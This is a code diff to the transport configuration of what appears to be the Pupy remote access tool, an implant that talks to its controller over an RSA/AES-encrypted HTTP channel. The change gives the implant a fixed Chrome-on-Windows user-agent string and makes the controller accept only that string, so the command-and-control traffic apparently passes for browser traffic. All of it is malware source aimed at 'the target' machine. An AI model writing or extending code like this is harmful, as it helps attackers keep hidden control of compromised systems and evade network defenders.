@@ -20,23 +20,25 @@ class TransportConf(Transport):
         except:
             rsa_pub_key=DEFAULT_RSA_PUB_KEY
 
+        user_agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+
         if self.launcher_type == LAUNCHER_TYPE_BIND: #reversing the RSA client/server for BIND payloads so the private key doesn't go on the target
             self.client_transport = chain_transports(
-                    PupyHTTPClient.custom(keep_alive=True),
+                    PupyHTTPClient.custom(keep_alive=True, user_agent=user_agent),
                     RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
                 )
             self.server_transport = chain_transports(
-                    PupyHTTPServer,
+                    PupyHTTPServer.custom(verify_user_agent=user_agent),
                     RSA_AESClient.custom(pubkey=rsa_pub_key, rsa_key_size=4096, aes_size=256),
                 )
 
         else:
             self.client_transport = chain_transports(
-                    PupyHTTPClient.custom(keep_alive=True),
+                    PupyHTTPClient.custom(keep_alive=True, user_agent=user_agent),
                     RSA_AESClient.custom(pubkey=rsa_pub_key, rsa_key_size=4096, aes_size=256),
                 )
             self.server_transport = chain_transports(
-                    PupyHTTPServer,
+                    PupyHTTPServer.custom(verify_user_agent=user_agent),
                     RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
                 )
 
